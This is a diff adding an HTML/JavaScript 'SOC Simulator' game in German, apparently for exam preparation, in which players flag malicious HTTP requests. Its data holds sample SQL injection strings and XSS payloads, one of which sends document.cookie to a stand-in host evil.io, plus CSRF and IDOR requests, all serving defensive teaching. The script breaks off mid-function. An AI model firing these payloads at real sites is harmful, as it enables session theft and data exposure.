@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOC Simulator – Angriffe erkennen</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@700;800&display=swap');
+
+:root {
+  --bg0:#060a0f; --bg1:#0b1118; --bg2:#111c27; --bg3:#162030;
+  --border:#1d2d3e; --border2:#243547;
+  --green:#39ff85; --green2:#0fba52;
+  --cyan:#00d4ff;  --cyan2:#0099bb;
+  --red:#ff3d5a;   --red2:#cc1f3a;
+  --yellow:#ffd60a;--orange:#ff8c00;
+  --purple:#b07cff;
+  --text:#8fa8be;  --text2:#bfd0e0;  --text3:#ddeaf5;
+  --gG:0 0 10px #39ff8555,0 0 25px #39ff8520;
+  --gC:0 0 10px #00d4ff55,0 0 25px #00d4ff20;
+  --gR:0 0 10px #ff3d5a55,0 0 25px #ff3d5a20;
+  --gY:0 0 10px #ffd60a55,0 0 25px #ffd60a20;
+}
+
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden}
+
+body{
+  background:var(--bg0);
+  color:var(--text);
+  font-family:'JetBrains Mono',monospace;
+  font-size:13px;
+  display:flex;
+  flex-direction:column;
+}
+
+/* grid overlay */
+body::before{
+  content:'';position:fixed;inset:0;
+  background-image:
+    linear-gradient(rgba(0,212,255,.025) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(0,212,255,.025) 1px,transparent 1px);
+  background-size:36px 36px;pointer-events:none;z-index:0;
+}
+
+/* ── TOP BAR ── */
+#topbar{
+  flex-shrink:0;
+  display:flex;align-items:center;gap:0;
+  background:var(--bg1);border-bottom:1px solid var(--border);
+  padding:0 16px;height:48px;z-index:10;position:relative;
+}
+.tb-section{
+  display:flex;align-items:center;gap:10px;
+  padding:0 16px;height:100%;border-right:1px solid var(--border);
+}
+.tb-section:last-child{border-right:none;margin-left:auto;}
+.tb-label{font-size:9px;letter-spacing:2px;text-transform:uppercase;color:#3a5570}
+.tb-val{font-family:'Syne',sans-serif;font-size:16px;font-weight:800;}
+.tb-val.green{color:var(--green);text-shadow:var(--gG);}
+.tb-val.red  {color:var(--red);  text-shadow:var(--gR);}
+.tb-val.yellow{color:var(--yellow);text-shadow:var(--gY);}
+.tb-val.cyan {color:var(--cyan); text-shadow:var(--gC);}
+.blink{animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+
+/* threat meter */
+#threat-bar-wrap{width:140px;height:6px;background:var(--bg3);border-radius:3px;overflow:hidden;border:1px solid var(--border2);}
+#threat-bar{height:100%;width:0%;border-radius:3px;transition:width .4s ease,background .4s;background:var(--green);}
+
+/* hearts */
+#lives-display{display:flex;gap:5px;align-items:center;}
+.heart{font-size:16px;transition:all .3s;filter:drop-shadow(0 0 4px #ff3d5a);}
+.heart.dead{opacity:.2;filter:none;}
+
+/* combo badge */
+#combo-badge{
+  padding:4px 12px;border-radius:20px;font-size:11px;font-weight:700;
+  background:rgba(0,212,255,.1);border:1px solid rgba(0,212,255,.3);
+  color:var(--cyan);letter-spacing:1px;
+  transition:all .2s;
+}
+#combo-badge.hot{background:rgba(255,214,10,.15);border-color:rgba(255,214,10,.5);color:var(--yellow);text-shadow:var(--gY);}
+
+/* ── LAYOUT ── */
+#layout{flex:1;display:flex;overflow:hidden;position:relative;z-index:1;}
+
+/* ── LOG PANEL ── */
+#log-panel{
+  flex:1;overflow:hidden;display:flex;flex-direction:column;
+  border-right:1px solid var(--border);
+}
+#log-header{
+  flex-shrink:0;display:flex;gap:0;
+  background:var(--bg2);border-bottom:1px solid var(--border);
+  font-size:10px;letter-spacing:1.5px;color:#3a5570;text-transform:uppercase;
+}
+.lh-cell{padding:7px 10px;border-right:1px solid var(--border);}
+.lh-time{width:90px;} .lh-ip{width:130px;} .lh-method{width:58px;}
+.lh-path{flex:1;} .lh-status{width:55px;text-align:center;}
+
+#log-scroll{flex:1;overflow:hidden;position:relative;}
+#log-list{
+  position:absolute;bottom:0;left:0;right:0;
+  display:flex;flex-direction:column;gap:0;
+}
+
+.log-row{
+  display:flex;align-items:center;gap:0;
+  border-bottom:1px solid rgba(29,45,62,.5);
+  cursor:pointer;
+  transition:background .12s;
+  animation:rowIn .2s ease;
+  position:relative;
+  flex-shrink:0;
+}
+@keyframes rowIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+
+.log-row:hover{background:rgba(0,212,255,.05);}
+.log-row.malicious-hint{background:rgba(255,61,90,.03);}
+.log-row.malicious-hint:hover{background:rgba(255,61,90,.07);}
+.log-row.correct-flag{background:rgba(57,255,133,.06)!important;border-left:3px solid var(--green);}
+.log-row.wrong-flag  {background:rgba(255,61,90,.08)!important;border-left:3px solid var(--red);}
+.log-row.missed      {background:rgba(255,140,0,.06)!important;border-left:3px solid var(--orange);animation:shake .3s ease;}
+.log-row.normal-flagged{background:rgba(176,124,255,.06)!important;border-left:3px solid var(--purple);}
+
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+
+.log-cell{padding:6px 10px;font-size:12px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;}
+.lc-time  {width:90px;color:#3a5570;font-size:11px;}
+.lc-ip    {width:130px;color:var(--purple);font-size:11px;}
+.lc-method{width:58px;font-weight:700;}
+.lc-method.GET {color:var(--cyan);}
+.lc-method.POST{color:var(--yellow);}
+.lc-path  {flex:1;color:var(--text2);}
+.lc-path .attack-part{color:var(--red);background:rgba(255,61,90,.12);border-radius:2px;padding:0 2px;}
+.lc-status{width:55px;text-align:center;font-weight:700;}
+.lc-status.s2xx{color:var(--green);}
+.lc-status.s3xx{color:var(--cyan);}
+.lc-status.s4xx{color:var(--red);}
+
+.flag-chip{
+  position:absolute;right:8px;top:50%;transform:translateY(-50%);
+  font-size:9px;letter-spacing:1px;padding:2px 8px;border-radius:2px;
+  font-weight:700;text-transform:uppercase;
+}
+.chip-ok {background:rgba(57,255,133,.15);color:var(--green);border:1px solid rgba(57,255,133,.3);}
+.chip-fp {background:rgba(176,124,255,.15);color:var(--purple);border:1px solid rgba(176,124,255,.3);}
+.chip-miss{background:rgba(255,140,0,.15);color:var(--orange);border:1px solid rgba(255,140,0,.3);}
+
+/* ── RIGHT PANEL ── */
+#right-panel{
+  width:300px;flex-shrink:0;
+  display:flex;flex-direction:column;
+  background:var(--bg1);
+}
+#event-log{
+  flex:1;overflow-y:auto;overflow-x:hidden;
+  padding:10px;
+  display:flex;flex-direction:column;gap:6px;
+}
+#event-log::-webkit-scrollbar{width:4px;}
+#event-log::-webkit-scrollbar-track{background:transparent;}
+#event-log::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px;}
+
+.event-entry{
+  padding:8px 10px;border-radius:3px;font-size:11px;line-height:1.6;
+  border:1px solid;animation:rowIn .2s ease;
+}
+.ev-correct{border-color:rgba(57,255,133,.25);background:rgba(57,255,133,.05);color:var(--green);}
+.ev-wrong  {border-color:rgba(255,61,90,.25);  background:rgba(255,61,90,.05);  color:var(--red);}
+.ev-miss   {border-color:rgba(255,140,0,.25);  background:rgba(255,140,0,.05);  color:var(--orange);}
+.ev-fp     {border-color:rgba(176,124,255,.25);background:rgba(176,124,255,.05);color:var(--purple);}
+.ev-sys    {border-color:var(--border2);       background:var(--bg2);           color:var(--text);}
+.event-entry b{color:var(--text3);}
+.event-entry code{
+  background:var(--bg0);border:1px solid var(--border2);
+  padding:1px 4px;border-radius:2px;font-size:10px;color:var(--cyan);
+}
+
+#wave-banner{
+  flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  padding:10px;background:var(--bg2);border-top:1px solid var(--border);
+  font-size:11px;color:var(--text);letter-spacing:1px;
+}
+.wave-dot{width:6px;height:6px;border-radius:50%;background:var(--green);
+  box-shadow:var(--gG);animation:blink 1.4s ease infinite;}
+
+/* ── IDENTIFY MODAL ── */
+#modal-overlay{
+  display:none;position:fixed;inset:0;z-index:200;
+  background:rgba(6,10,15,.85);backdrop-filter:blur(4px);
+  align-items:center;justify-content:center;
+}
+#modal-overlay.show{display:flex;}
+
+#modal{
+  width:580px;max-width:95vw;
+  background:var(--bg1);border:1px solid var(--border2);
+  border-radius:4px;overflow:hidden;
+  animation:modalIn .25s cubic-bezier(.34,1.56,.64,1);
+}
+@keyframes modalIn{from{opacity:0;transform:scale(.94)}to{opacity:1;transform:none}}
+
+#modal-header{
+  background:var(--bg2);border-bottom:1px solid var(--border);
+  padding:12px 18px;display:flex;align-items:center;justify-content:space-between;
+}
+#modal-title{font-family:'Syne',sans-serif;font-size:13px;color:var(--cyan);letter-spacing:2px;text-transform:uppercase;}
+#modal-timer-bar-wrap{width:120px;height:4px;background:var(--bg3);border-radius:2px;overflow:hidden;}
+#modal-timer-bar{height:100%;width:100%;background:var(--cyan);border-radius:2px;transition:width .1s linear,background .3s;}
+
+#modal-request{
+  padding:14px 18px;
+  background:var(--bg0);border-bottom:1px solid var(--border);
+  font-size:11.5px;line-height:1.9;color:var(--text);
+  white-space:pre-wrap;word-break:break-all;
+  max-height:160px;overflow-y:auto;
+}
+#modal-request .hl{color:var(--red);font-weight:700;background:rgba(255,61,90,.12);border-radius:2px;padding:0 2px;}
+#modal-request .hl-key{color:var(--yellow);}
+#modal-request .hl-val{color:var(--orange);}
+
+#modal-question{padding:14px 18px 10px;font-size:13px;color:var(--text2);}
+#modal-choices{padding:0 18px 18px;display:flex;flex-direction:column;gap:8px;}
+
+.mc-btn{
+  background:var(--bg2);border:1px solid var(--border2);
+  border-radius:3px;padding:10px 14px;
+  font-family:'JetBrains Mono',monospace;font-size:12px;
+  color:var(--text);cursor:pointer;text-align:left;
+  display:flex;align-items:center;gap:10px;
+  transition:all .15s;
+}
+.mc-btn .mc-key{color:var(--cyan);font-size:11px;width:18px;flex-shrink:0;}
+.mc-btn:hover:not(:disabled){
+  border-color:var(--cyan);background:rgba(0,212,255,.07);
+  color:var(--text3);transform:translateX(3px);
+}
+.mc-btn.correct{border-color:var(--green)!important;background:rgba(57,255,133,.08)!important;color:var(--green)!important;}
+.mc-btn.wrong  {border-color:var(--red)!important;  background:rgba(255,61,90,.08)!important;  color:var(--red)!important;}
+
+/* ── SCREENS ── */
+#start-screen,#end-screen{
+  position:fixed;inset:0;z-index:300;
+  background:var(--bg0);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  text-align:center;padding:20px;
+}
+#end-screen{display:none;}
+
+.big-title{
+  font-family:'Syne',sans-serif;
+  font-size:clamp(24px,5vw,42px);font-weight:800;
+  color:var(--text3);margin-bottom:8px;
+}
+.big-sub{font-size:11px;letter-spacing:3px;color:var(--cyan);text-transform:uppercase;margin-bottom:30px;}
+
+.attack-chips{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin:20px 0 30px;max-width:600px;}
+.achip{
+  padding:6px 14px;border-radius:20px;font-size:11px;
+  border:1px solid var(--border2);background:var(--bg2);color:var(--text);
+}
+.achip span{margin-right:6px;}
+
+.big-btn{
+  padding:14px 40px;border:none;border-radius:3px;
+  font-family:'Syne',sans-serif;font-size:16px;font-weight:800;letter-spacing:2px;
+  cursor:pointer;text-transform:uppercase;transition:all .2s;
+}
+.big-btn.go {background:var(--green);color:var(--bg0);box-shadow:var(--gG);}
+.big-btn.go:hover{background:var(--cyan);box-shadow:var(--gC);}
+.big-btn.again{background:var(--bg2);color:var(--cyan);border:1px solid var(--cyan);}
+.big-btn.again:hover{background:rgba(0,212,255,.1);box-shadow:var(--gC);}
+
+/* end screen stats */
+.stat-grid{display:flex;gap:20px;flex-wrap:wrap;justify-content:center;margin:20px 0;}
+.stat-box{
+  background:var(--bg1);border:1px solid var(--border2);border-radius:4px;
+  padding:16px 24px;min-width:120px;
+}
+.stat-box .sv{font-family:'Syne',sans-serif;font-size:28px;font-weight:800;line-height:1;}
+.stat-box .sl{font-size:10px;letter-spacing:2px;color:#3a5570;text-transform:uppercase;margin-top:4px;}
+
+/* screen flash */
+#flash{position:fixed;inset:0;pointer-events:none;z-index:400;opacity:0;}
+#flash.red  {background:#ff3d5a;animation:flash .3s ease;}
+#flash.green{background:#39ff85;animation:flash .3s ease;}
+@keyframes flash{0%{opacity:.25}100%{opacity:0}}
+
+/* scrollbar for log */
+#log-scroll::-webkit-scrollbar{display:none;}
+</style>
+</head>
+<body>
+
+<!-- FLASH OVERLAY -->
+<div id="flash"></div>
+
+<!-- START SCREEN -->
+<div id="start-screen">
+  <div style="font-size:36px;margin-bottom:12px;">🛡️</div>
+  <div class="big-title">SOC SIMULATOR</div>
+  <div class="big-sub">Web Security · Angriffe erkennen · Klausurvorbereitung</div>
+  <p style="max-width:520px;line-height:1.8;color:var(--text);font-size:13px;margin-bottom:8px;">
+    HTTP-Requests strömen live herein. <strong style="color:var(--text3)">Klicke verdächtige Zeilen an</strong> und benenne den Angriff — bevor er den Server erreicht.<br>
+    Normale Requests <strong style="color:var(--text3)">nicht anklicken</strong> (False Positives kosten Punkte).
+  </p>
+  <div class="attack-chips">
+    <div class="achip"><span>💉</span>SQL Injection</div>
+    <div class="achip"><span>📜</span>Cross-Site Scripting</div>
+    <div class="achip"><span>🔄</span>CSRF</div>
+    <div class="achip"><span>🔢</span>IDOR</div>
+    <div class="achip"><span>🔑</span>Broken Auth</div>
+    <div class="achip"><span>🕵️</span>User Enumeration</div>
+    <div class="achip"><span>🧂</span>Session Hijacking</div>
+  </div>
+  <div style="display:flex;gap:16px;font-size:12px;color:var(--text);margin-bottom:28px;flex-wrap:wrap;justify-content:center;">
+    <span>❤️❤️❤️ 3 Leben</span>
+    <span>⚡ Combo-Multiplier</span>
+    <span>⏱️ Timer pro Angriff</span>
+    <span>📈 3 Wellen</span>
+  </div>
+  <button class="big-btn go" onclick="startGame()">[ SYSTEM STARTEN ]</button>
+</div>
+
+<!-- END SCREEN -->
+<div id="end-screen">
+  <div id="end-icon" style="font-size:48px;margin-bottom:12px;">🏆</div>
+  <div class="big-title" id="end-title">Mission beendet</div>
+  <div class="big-sub" id="end-sub">Einsatz abgeschlossen</div>
+  <div class="stat-grid">
+    <div class="stat-box"><div class="sv green" id="es-score">0</div><div class="sl">Punkte</div></div>
+    <div class="stat-box"><div class="sv" id="es-detected" style="color:var(--cyan)">0</div><div class="sl">Erkannt</div></div>
+    <div class="stat-box"><div class="sv" id="es-missed" style="color:var(--orange)">0</div><div class="sl">Verpasst</div></div>
+    <div class="stat-box"><div class="sv" id="es-fp" style="color:var(--purple)">0</div><div class="sl">False Pos.</div></div>
+    <div class="stat-box"><div class="sv" id="es-acc" style="color:var(--yellow)">0%</div><div class="sl">Genauigkeit</div></div>
+  </div>
+  <p id="end-msg" style="max-width:500px;color:var(--text);font-size:13px;line-height:1.8;margin:12px auto 24px;"></p>
+  <button class="big-btn again" onclick="startGame()">[ Nochmal spielen ]</button>
+</div>
+
+<!-- TOP BAR -->
+<div id="topbar">
+  <div class="tb-section">
+    <div>
+      <div class="tb-label">Score</div>
+      <div class="tb-val green" id="hud-score">0</div>
+    </div>
+  </div>
+  <div class="tb-section">
+    <div>
+      <div class="tb-label">Combo</div>
+      <div id="combo-badge">x1</div>
+    </div>
+  </div>
+  <div class="tb-section" style="flex-direction:column;align-items:flex-start;gap:4px;">
+    <div class="tb-label">Bedrohungslevel</div>
+    <div id="threat-bar-wrap"><div id="threat-bar"></div></div>
+  </div>
+  <div class="tb-section">
+    <div>
+      <div class="tb-label">Welle</div>
+      <div class="tb-val cyan" id="hud-wave">1 / 3</div>
+    </div>
+  </div>
+  <div class="tb-section">
+    <div class="tb-label">Leben</div>
+    <div id="lives-display">
+      <span class="heart" id="h1">❤️</span>
+      <span class="heart" id="h2">❤️</span>
+      <span class="heart" id="h3">❤️</span>
+    </div>
+  </div>
+  <div class="tb-section" style="border-right:none;">
+    <div>
+      <div class="tb-label">Status</div>
+      <div class="tb-val green blink" id="hud-status">● LIVE</div>
+    </div>
+  </div>
+</div>
+
+<!-- MAIN LAYOUT -->
+<div id="layout">
+  <!-- LOG PANEL -->
+  <div id="log-panel">
+    <div id="log-header">
+      <div class="lh-cell lh-time">Zeit</div>
+      <div class="lh-cell lh-ip">Quell-IP</div>
+      <div class="lh-cell lh-method">Methode</div>
+      <div class="lh-cell lh-path">Request-Pfad / Parameter</div>
+      <div class="lh-cell lh-status">Status</div>
+    </div>
+    <div id="log-scroll"><div id="log-list"></div></div>
+  </div>
+  <!-- RIGHT PANEL -->
+  <div id="right-panel">
+    <div id="event-log"></div>
+    <div id="wave-banner">
+      <div class="wave-dot"></div>
+      <span id="wave-label">WELLE 1 – Basis-Angriffe</span>
+      <div class="wave-dot"></div>
+    </div>
+  </div>
+</div>
+
+<!-- IDENTIFY MODAL -->
+<div id="modal-overlay">
+  <div id="modal">
+    <div id="modal-header">
+      <div id="modal-title">⚠ VERDÄCHTIG – Angriff identifizieren</div>
+      <div id="modal-timer-bar-wrap"><div id="modal-timer-bar"></div></div>
+    </div>
+    <div id="modal-request"></div>
+    <div id="modal-question">Welcher Angriffstyp liegt vor?</div>
+    <div id="modal-choices"></div>
+  </div>
+</div>
+
+<script>
+// ─── REQUEST DATABASE ──────────────────────────────────────────────────────
+var IPS = [
+  "192.168.4.12","10.0.0.44","172.16.8.99","45.33.12.88",
+  "185.220.101.5","91.134.22.180","37.48.96.22","103.21.244.0",
+  "23.254.211.100","5.8.18.237","198.51.100.33","203.0.113.77"
+];
+var AGENTS = [
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+  "curl/7.68.0","python-requests/2.26.0",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X)","sqlmap/1.6","Nikto/2.1.6",
+  "Mozilla/5.0 (Linux; Android 11)","Googlebot/2.1 (+http://www.google.com/bot.html)"
+];
+
+// Each entry: { label, type, path, method, body(opt), highlight(opt), choices, correct, explanation }
+var ATTACKS = [
+  // ── SQL INJECTION ──
+  {
+    type:"sqli",label:"SQL Injection",
+    method:"GET",status:"200",
+    path:"/login?userId=%27%20OR%201%3D1%20--&password=x",
+    display:"/login?userId=<span class='attack-part'>' OR 1=1 --</span>&password=x",
+    full:"GET /login?userId=' OR 1=1 --&password=x HTTP/1.1\nHost: bank.example.com\nUser-Agent: sqlmap/1.6",
+    choices:["SQL Injection","Cross-Site Scripting (XSS)","CSRF","IDOR"],correct:0,
+    explanation:"<b>' OR 1=1 --</b> bricht den SQL-String auf, macht die WHERE-Bedingung immer wahr und kommentiert den Passwort-Check aus."
+  },
+  {
+    type:"sqli",label:"SQL Injection (UNION)",
+    method:"GET",status:"200",
+    path:"/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
+    display:"/products?id=1 <span class='attack-part'>UNION SELECT username,password FROM users--</span>",
+    full:"GET /products?id=1 UNION SELECT username,password FROM users-- HTTP/1.1\nHost: shop.example.com",
+    choices:["SQL Injection","IDOR","User Enumeration","XSS"],correct:0,
+    explanation:"<b>UNION SELECT</b> hängt eine zweite SQL-Abfrage an – hier wird die users-Tabelle ausgelesen."
+  },
+  {
+    type:"sqli",label:"SQL Injection (Blind)",
+    method:"GET",status:"200",
+    path:"/item?id=5%20AND%20SLEEP(5)--",
+    display:"/item?id=5 <span class='attack-part'>AND SLEEP(5)--</span>",
+    full:"GET /item?id=5 AND SLEEP(5)-- HTTP/1.1\nHost: app.example.com\nUser-Agent: python-requests/2.26.0",
+    choices:["SQL Injection (Blind/Time-based)","CSRF","IDOR","Broken Auth"],correct:0,
+    explanation:"<b>SLEEP(5)</b> ist ein Blind-SQLi-Trick: Antwort verzögert sich um 5s, wenn die Injektion erfolgreich ist."
+  },
+  // ── XSS ──
+  {
+    type:"xss",label:"Reflected XSS",
+    method:"GET",status:"200",
+    path:"/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E",
+    display:"/search?q=<span class='attack-part'>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>",
+    full:"GET /search?q=<script>alert(document.cookie)<\/script> HTTP/1.1\nHost: portal.example.com",
+    choices:["Cross-Site Scripting (XSS)","SQL Injection","CSRF","Session Hijacking"],correct:0,
+    explanation:"<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> ist klassischer XSS – Script wird in die Seite injiziert und gibt Session-Cookies aus."
+  },
+  {
+    type:"xss",label:"XSS via Login-Parameter",
+    method:"GET",status:"200",
+    path:'/login?userId=user"><script>document.logon.action="https://evil.io/steal"<\/script>',
+    display:'/login?userId=user<span class=\'attack-part\'">"><script>document.logon.action="evil.io"<\/script></span>',
+    full:"GET /login?userId=user\">&lt;script&gt;document.logon.action=\"https://evil.io/steal\"&lt;/script&gt; HTTP/1.1\nHost: bank.example.com",
+    choices:["XSS – Formular-Manipulation","CSRF","IDOR","SQL Injection"],correct:0,
+    explanation:"Das <code>\"&gt;</code> bricht das HTML-Attribut auf, der Script-Tag ändert das Formular-Ziel – Credentials gehen an den Angreifer."
+  },
+  {
+    type:"xss",label:"XSS im img-Tag",
+    method:"GET",status:"200",
+    path:"/profile?name=%3Cimg%20src%3Dx%20onerror%3D%22fetch('evil.io?c='%2Bdocument.cookie)%22%3E",
+    display:"/profile?name=<span class='attack-part'>&lt;img src=x onerror=\"fetch('evil.io?c='+document.cookie)\"&gt;</span>",
+    full:"GET /profile?name=<img src=x onerror=\"fetch('evil.io?c='+document.cookie)\"> HTTP/1.1\nHost: app.example.com",
+    choices:["Cross-Site Scripting (XSS)","CSRF","IDOR","Broken Auth"],correct:0,
+    explanation:"<code>onerror</code> wird ausgeführt, da das Bild nicht lädt. Schickt document.cookie an den Angreifer-Server."
+  },
+  // ── CSRF ──
+  {
+    type:"csrf",label:"CSRF – Geldüberweisung",
+    method:"POST",status:"200",
+    path:"/transfer",
+    display:"/transfer  <span class='attack-part'>[Origin: evil.site | Kein CSRF-Token]</span>",
+    full:"POST /transfer HTTP/1.1\nHost: bank.example.com\nOrigin: https://evil-casino.com\nReferer: https://evil-casino.com/win\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=A3F9...\n\nto=attacker&amount=5000",
+    choices:["CSRF – Cross-Site Request Forgery","XSS","SQL Injection","Session Hijacking"],correct:0,
+    explanation:"<b>Origin: evil-casino.com</b> und kein CSRF-Token. Der Browser schickt automatisch den Session-Cookie mit – der Server kann legitim und gefälscht nicht unterscheiden."
+  },
+  {
+    type:"csrf",label:"CSRF – Passwort-Änderung",
+    method:"POST",status:"302",
+    path:"/account/password",
+    display:"/account/password  <span class='attack-part'>[Referer: pastebin.com | kein csrf_token]</span>",
+    full:"POST /account/password HTTP/1.1\nHost: myapp.example.com\nReferer: https://pastebin.com/xA1b2C\nCookie: session=eyJhbG...\nContent-Type: application/x-www-form-urlencoded\n\nnew_password=hacked123",
+    choices:["CSRF","XSS","Broken Authentication","IDOR"],correct:0,
+    explanation:"Passwort-Änderung von fremder Domain (pastebin) initiiert, kein CSRF-Token. Klassischer CSRF-Angriff auf State-Changing-Request."
+  },
+  // ── IDOR ──
+  {
+    type:"idor",label:"IDOR – User-Daten",
+    method:"GET",status:"200",
+    path:"/api/user/1337/profile",
+    display:"/api/user/<span class='attack-part'>1337</span>/profile  <span class='attack-part'>[Auth: user_id=42]</span>",
+    full:"GET /api/user/1337/profile HTTP/1.1\nHost: app.example.com\nAuthorization: Bearer eyJ...\nX-User-Id: 42\nNote: authenticated as user 42, accessing user 1337",
+    choices:["IDOR – Insecure Direct Object Reference","Broken Auth","SQL Injection","CSRF"],correct:0,
+    explanation:"User 42 greift auf Profil von User 1337 zu. Fehlende serverseitige Autorisierungsprüfung = IDOR."
+  },
+  {
+    type:"idor",label:"IDOR – Rechnung",
+    method:"GET",status:"200",
+    path:"/invoices/download?id=10042",
+    display:"/invoices/download?id=<span class='attack-part'>10042</span>  <span class='attack-part'>[Session: customer #89]</span>",
+    full:"GET /invoices/download?id=10042 HTTP/1.1\nHost: shop.example.com\nCookie: customer_id=89; session=abc123\nNote: customer 89 incrementing invoice IDs",
+    choices:["IDOR","SQL Injection","CSRF","XSS"],correct:0,
+    explanation:"Kundenummer 89 lädt Rechnung 10042 herunter (gehört zu einem anderen Kunden). Simples ID-Enumerating."
+  },
+  // ── BROKEN AUTH / SESSION ──
+  {
+    type:"session",label:"Session Hijacking",
+    method:"GET",status:"200",
+    path:"/dashboard",
+    display:"/dashboard  <span class='attack-part'>[Cookie von fremder IP gestohlen]</span>",
+    full:"GET /dashboard HTTP/1.1\nHost: bank.example.com\nCookie: JSESSIONID=3A8F6B5C; _ga=GA1\nX-Forwarded-For: 91.134.22.180\nNote: Original session created from 192.168.1.5, now used from 91.134.22.180",
+    choices:["Session Hijacking","IDOR","CSRF","Broken Auth"],correct:0,
+    explanation:"Gleiche Session-ID, andere IP-Adresse. Hinweis auf gestohlenen Cookie (z.B. via XSS oder Netzwerk-Sniffing)."
+  },
+  {
+    type:"auth",label:"Brute Force Login",
+    method:"POST",status:"401",
+    path:"/login  [attempt 47/∞]",
+    display:"/login  <span class='attack-part'>[47. Fehlversuch in 30 Sekunden]</span>",
+    full:"POST /login HTTP/1.1\nHost: admin.example.com\nContent-Type: application/x-www-form-urlencoded\nX-Forwarded-For: 45.33.12.88\nNote: 47th login attempt in 30 seconds from same IP\n\nusername=admin&password=admin1234",
+    choices:["Brute Force / Broken Authentication","SQL Injection","CSRF","User Enumeration"],correct:0,
+    explanation:"47 Login-Versuche in 30 Sekunden = klassischer Brute-Force-Angriff. Fehlende Rate-Limiting-Maßnahme."
+  },
+  // ── USER ENUMERATION ──
+  {
+    type:"enum",label:"User Enumeration",
+    method:"POST",status:"200",
+    path:"/forgot-password",
+    display:"/forgot-password  <span class='attack-part'>[Response verrät ob User existiert]</span>",
+    full:"POST /forgot-password HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\n\n{\"email\": \"admin&#64;example.com\"}\n\n--- Response ---\nHTTP/1.1 200 OK\n{\"error\": \"This email is not registered\"}",
+    choices:["User Enumeration","CSRF","Broken Auth","IDOR"],correct:0,
+    explanation:"Die Fehlermeldung <b>'This email is not registered'</b> verrät ob ein Account existiert – ein Angreifer kann damit valid/invalid Accounts unterscheiden."
+  },
+];
+
+// NORMAL (benign) requests – should NOT be flagged
+var NORMALS = [
+  {method:"GET",status:"200",path:"/index.html",full:"GET /index.html HTTP/1.1\nHost: example.com"},
+  {method:"GET",status:"200",path:"/api/products?category=electronics",full:"GET /api/products?category=electronics HTTP/1.1"},
+  {method:"POST",status:"201",path:"/api/cart/items",full:"POST /api/cart/items HTTP/1.1\nContent-Type: application/json\n{\"productId\":42,\"qty\":1}"},
+  {method:"GET",status:"200",path:"/static/main.css",full:"GET /static/main.css HTTP/1.1"},
+  {method:"GET",status:"200",path:"/api/user/profile",full:"GET /api/user/profile HTTP/1.1\nAuthorization: Bearer eyJ...\nNote: authenticated request, own profile"},
+  {method:"GET",status:"404",path:"/favicon.ico",full:"GET /favicon.ico HTTP/1.1"},
+  {method:"POST",status:"200",path:"/login",full:"POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=huber&password=correct_password"},
+  {method:"GET",status:"200",path:"/api/orders?page=2&limit=20",full:"GET /api/orders?page=2&limit=20 HTTP/1.1\nAuthorization: Bearer eyJ..."},
+  {method:"GET",status:"301",path:"/old-page",full:"GET /old-page HTTP/1.1"},
+  {method:"PUT",status:"200",path:"/api/user/settings",full:"PUT /api/user/settings HTTP/1.1\nContent-Type: application/json"},
+  {method:"GET",status:"200",path:"/search?q=laptop+256gb",full:"GET /search?q=laptop+256gb HTTP/1.1"},
+  {method:"DELETE",status:"204",path:"/api/cart/item/5",full:"DELETE /api/cart/item/5 HTTP/1.1\nAuthorization: Bearer eyJ..."},
+];
+
+// ─── GAME STATE ────────────────────────────────────────────────────────────
+var score=0, lives=3, combo=1, wave=1, threatened=0;
+var gameRunning=false, currentModal=null, modalTimer=null;
+var statsDetected=0, statsMissed=0, statsFP=0;
+var spawnTimer=null;
+var pendingAttacks=[]; // attacks spawned but not yet flagged
+var rowMap={}; // id -> {row, attack, flagged}
+var rowCounter=0;
+var MAX_ROWS=28;
+// wave config: [attackRatio, interval(ms), timerSec]
+var WAVE_CONFIGS=[
+  {ratio:0.35, interval:2200, timer:12, label:"WELLE 1 – Basis-Angriffe"},
+  {ratio:0.45, interval:1700, timer:10, label:"WELLE 2 – Erhöhte Frequenz"},
+  {ratio:0.55, interval:1300, timer:8,  label:"WELLE 3 – HIGH ALERT"}
+];
+var waveAttackCount=0, WAVE_SIZE=14;
+
+function startGame(){
+  document.getElementById("start-screen").style.display="none";
+  document.getElementById("end-screen").style.display="none";
+  score=0;lives=3;combo=1;wave=1;threatened=0;
+  statsDetected=0;statsMissed=0;statsFP=0;
+  gameRunning=true;
+  pendingAttacks=[];rowMap={};rowCounter=0;
+  document.getElementById("log-list").innerHTML="";
+  document.getElementById("event-log").innerHTML="";
+  updateHUD();
+  startWave(0);
+}
+
+function startWave(waveIdx){
+  wave=waveIdx+1;
+  waveAttackCount=0;
+  var cfg=WAVE_CONFIGS[waveIdx];
+  document.getElementById("hud-wave").textContent=wave+" / 3";
+  document.getElementById("wave-label").textContent=cfg.label;
+  addEvent("sys","<b>"+cfg.label+"</b> gestartet – bereit?");
+  if(spawnTimer) clearInterval(spawnTimer);
+  spawnTimer=setInterval(function(){
+    if(!gameRunning) return;
+    spawnRow(cfg);
+    waveAttackCount++;
+    if(waveAttackCount>=WAVE_SIZE){
+      clearInterval(spawnTimer);
+      spawnTimer=null;
+      // wait a bit, then next wave or end
+      setTimeout(function(){
+        if(!gameRunning) return;
+        if(waveIdx<2) startWave(waveIdx+1);
+        else endGame();
